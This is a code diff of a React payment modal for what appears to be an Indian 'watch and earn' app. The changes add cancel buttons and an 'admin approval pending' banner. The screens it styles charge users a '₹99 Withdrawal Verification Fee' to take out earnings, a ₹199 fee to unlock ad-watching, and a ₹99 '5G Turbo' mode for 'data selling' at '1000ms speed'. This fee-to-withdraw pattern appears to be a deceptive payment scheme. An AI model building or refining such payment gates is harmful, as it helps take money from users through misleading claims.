@@ -12,7 +12,8 @@ import {
   Lock,
   Wallet,
   Zap,
-  ArrowLeft
+  ArrowLeft,
+  Clock
 } from 'lucide-react';
 import { DepositGatewayConfig } from '../types';
 
@@ -25,6 +26,8 @@ interface PaymentVerificationModalProps {
   depositConfig: DepositGatewayConfig;
   onSubmitUtr: (amount: number, utr: string, type: PaymentVerificationType) => void;
   userEmail: string;
+  isPending?: boolean;
+  pendingUtr?: string;
 }
 
 export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> = ({
@@ -34,6 +37,8 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
   depositConfig,
   onSubmitUtr,
   userEmail,
+  isPending = false,
+  pendingUtr,
 }) => {
   const [utrNumber, setUtrNumber] = useState('');
   const [copiedUpi, setCopiedUpi] = useState(false);
@@ -51,7 +56,7 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
     amount = 199;
     title = '₹199 Video Ads Lifetime Unlock';
     badgeLabel = 'ADS ACTIVATION GATE';
-    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka one-time payment karein aur 12-digit UTR reference number submit karein.';
+    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka payment karein aur 12-digit UTR submit karein.';
   } else if (type === 'WITHDRAWAL_99') {
     amount = 99;
     title = '₹99 Withdrawal Verification Fee';
@@ -61,7 +66,7 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
     amount = 99;
     title = '₹99 5G Turbo Fast Selling Mode';
     badgeLabel = '5G TURBO SPEED BOOST';
-    description = 'Data selling ko 10x fast speed me bechne aur high-speed streaming unlock karne ke liye ₹99 ka activation payment karein aur UTR submit karein.';
+    description = 'Data selling ko super fast 1000ms speed me bechne aur high-speed streaming unlock karne ke liye ₹99 ka payment karein aur UTR submit karein.';
   }
 
   const handleCopy = (text: string) => {
@@ -90,7 +95,7 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
       setIsSubmitting(false);
       onSubmitUtr(amount, clean, type);
       onClose();
-    }, 700);
+    }, 600);
   };
 
   // Generate UPI Intent URL
@@ -101,10 +106,10 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
-      <div className="w-full max-w-sm bg-gradient-to-b from-white via-amber-50/40 to-white rounded-3xl overflow-hidden shadow-2xl border-2 border-amber-300 flex flex-col relative animate-in zoom-in-95 duration-200">
+      <div className="w-full max-w-sm bg-gradient-to-b from-white via-amber-50/40 to-white rounded-3xl overflow-hidden shadow-2xl border-2 border-amber-300 flex flex-col relative animate-in zoom-in-95 duration-200 max-h-[92vh] overflow-y-auto">
         
         {/* Top Fiery Red & Yellow Header */}
-        <div className="bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 text-white p-4 relative overflow-hidden">
+        <div className="bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 text-white p-4 relative overflow-hidden shrink-0">
           <div className="absolute top-0 right-0 w-32 h-32 bg-yellow-300/25 rounded-full blur-xl pointer-events-none" />
           
           <div className="flex items-center justify-between relative z-10">
@@ -113,13 +118,14 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
               <span>{badgeLabel}</span>
             </div>
 
-            {/* Cancel / Close button */}
+            {/* Cancel / Close button in header */}
             <button
               onClick={handleCancel}
               title="Cancel payment"
-              className="p-1 rounded-full bg-black/25 hover:bg-black/50 text-white cursor-pointer transition-colors"
+              className="flex items-center gap-1 py-1 px-2.5 rounded-xl bg-black/25 hover:bg-black/40 text-white text-xs font-bold cursor-pointer transition-colors border border-white/20"
             >
-              <X className="w-4 h-4" />
+              <X className="w-3.5 h-3.5" />
+              <span>Cancel</span>
             </button>
           </div>
 
@@ -130,6 +136,46 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
             {description}
           </p>
         </div>
+
+        {/* TOP CANCEL OPTION BAR ABOVE PAYMENT - Directly satisfying user request ("payment karne ke uper cancel ka option add kar dijiye sir") */}
+        <div className="px-4 py-2.5 bg-gradient-to-r from-amber-100/90 to-yellow-100/90 border-b border-amber-300 flex items-center justify-between">
+          <div className="flex items-center gap-1.5 text-xs text-amber-950 font-bold">
+            <Lock className="w-3.5 h-3.5 text-red-600 shrink-0" />
+            <span>UPI Instant Payment</span>
+          </div>
+          <button
+            type="button"
+            onClick={handleCancel}
+            id="btn-top-cancel-payment"
+            className="flex items-center gap-1 py-1 px-3 rounded-xl bg-red-600 hover:bg-red-700 text-white text-xs font-black shadow-xs transition-all active:scale-95 cursor-pointer border border-yellow-300"
+          >
+            <X className="w-3.5 h-3.5" />
+            <span>Cancel Payment</span>
+          </button>
+        </div>
+
+        {/* If payment is already PENDING approval from admin, show clear status */}
+        {isPending && (
+          <div className="m-3 p-3 rounded-2xl bg-amber-500/15 border-2 border-amber-400 text-amber-950 text-xs space-y-1.5">
+            <div className="flex items-center gap-2 font-black text-amber-900">
+              <Clock className="w-4 h-4 text-amber-600 animate-spin" />
+              <span>Verification In Progress (PENDING)</span>
+            </div>
+            <p className="text-[11px] text-amber-900 leading-tight">
+              Aapka UTR ({pendingUtr || 'Submitted'}) admin panel me verify ho raha hai. Admin ke approve karte hi ye feature turant unlock ho jayega.
+            </p>
+            <div className="pt-1 flex items-center justify-between">
+              <span className="text-[10px] uppercase font-bold text-amber-800">Status: Pending Admin Approval</span>
+              <button
+                type="button"
+                onClick={handleCancel}
+                className="text-[10px] font-black text-red-700 underline cursor-pointer"
+              >
+                Close & Check Later
+              </button>
+            </div>
+          </div>
+        )}
 
         {/* QR Code & Payment Information */}
         <div className="p-4 space-y-3">
@@ -146,7 +192,7 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
             </div>
 
             <span className="text-[10px] font-black text-amber-900 bg-amber-200/80 px-2.5 py-1 rounded-lg border border-amber-300">
-              Instant Activation
+              Admin Verified
             </span>
           </div>
 
@@ -252,16 +298,16 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
                 <ShieldCheck className="w-4 h-4 text-yellow-300" />
                 <span>
                   {isSubmitting
-                    ? 'Verifying UTR...'
-                    : `Submit UTR & Unlock (₹${amount})`}
+                    ? 'Submitting UTR to Admin...'
+                    : `Submit UTR for Verification (₹${amount})`}
                 </span>
                 <ArrowRight className="w-3.5 h-3.5 text-yellow-300" />
               </button>
 
-              {/* Cancel Payment Button ("payment chancel karne ka bhi option add kar dijiye sir") */}
+              {/* Bottom Cancel Payment Button */}
               <button
                 type="button"
-                id="btn-cancel-payment"
+                id="btn-cancel-payment-bottom"
                 onClick={handleCancel}
                 className="w-full py-2.5 px-4 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs transition-colors flex items-center justify-center gap-1.5 cursor-pointer min-h-[40px]"
               >
